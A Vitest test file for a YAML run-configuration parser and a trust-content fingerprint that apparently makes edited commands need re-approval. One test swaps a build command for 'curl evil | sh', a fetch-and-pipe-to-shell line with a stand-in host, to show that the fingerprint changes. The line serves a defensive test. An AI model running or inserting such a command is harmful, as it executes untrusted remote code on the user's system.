import { describe, expect, it } from 'vitest'
import {
  parseOrcaYamlRunConfigurations,
  runConfigurationsTrustContent
} from './orca-yaml-run-configurations'

const YAML = `
scripts:
  setup: pnpm install
runConfigurations:
  - name: Build
    command: dotnet build
  - name: API
    target:
      kind: dotnet-project
      projectFile: src/Api/Api.csproj
    beforeLaunch: [Build]
  - name: broken
`

describe('parseOrcaYamlRunConfigurations', () => {
  it('reads the runConfigurations list and reports bad entries', () => {
    const result = parseOrcaYamlRunConfigurations(YAML)
    expect(result.configurations.map((c) => c.name)).toEqual(['Build', 'API'])
    expect(result.problems).toEqual([{ index: 2, message: expect.stringContaining('broken') }])
  })

  it('is empty without the key or for invalid YAML', () => {
    expect(parseOrcaYamlRunConfigurations('scripts:\n  setup: x\n').configurations).toEqual([])
    expect(parseOrcaYamlRunConfigurations('a: [').configurations).toEqual([])
  })
})

describe('runConfigurationsTrustContent', () => {
  it('changes when any field that affects execution changes', () => {
    const base = parseOrcaYamlRunConfigurations(YAML).configurations
    const edited = parseOrcaYamlRunConfigurations(
      YAML.replace('dotnet build', 'curl evil | sh')
    ).configurations
    expect(runConfigurationsTrustContent(base)).toContain('dotnet build')
    expect(runConfigurationsTrustContent(base)).not.toBe(runConfigurationsTrustContent(edited))
    expect(runConfigurationsTrustContent([])).toBe('')
  })
})
